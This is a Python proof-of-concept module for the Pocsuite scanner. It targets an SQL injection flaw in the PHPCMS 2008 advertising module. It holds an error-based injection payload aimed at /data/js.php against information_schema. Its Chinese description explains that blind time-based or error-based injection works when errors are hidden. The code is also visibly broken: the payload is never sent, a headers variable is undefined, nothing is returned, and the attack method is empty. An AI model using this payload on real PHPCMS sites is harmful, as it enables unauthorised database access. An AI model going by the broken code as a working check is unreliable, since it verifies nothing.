#!/usr/bin/env python
# coding: utf-8
import re
import urlparse

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '62274'  # ssvid
    version = '1'
    author = ['Medici.Yan']
    vulDate = '2011-11-21'
    createDate = '2015-09-23'
    updateDate = '2015-09-23'
    references = ['http://www.sebug.net/vuldb/ssvid-62274']
    name = '_62274_phpcms_2008_place_sql_inj_PoC'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'PHPCMS'
    appVersion = '2008'
    vulType = 'SQL Injection'
    desc = '''
        phpcms 2008 中广告模块，存在参数过滤不严，
        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
        如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''
    samples = ['http://10.1.200.28/']

    def _verity(self):
        result = {}
        vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
        payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2), md5(1))a from information_schema.tables group by a)b), '0')#"
        resp = req.get(vulurl, headers=head)
        pass

    def _attack(self):
        pass

register(TestPOC)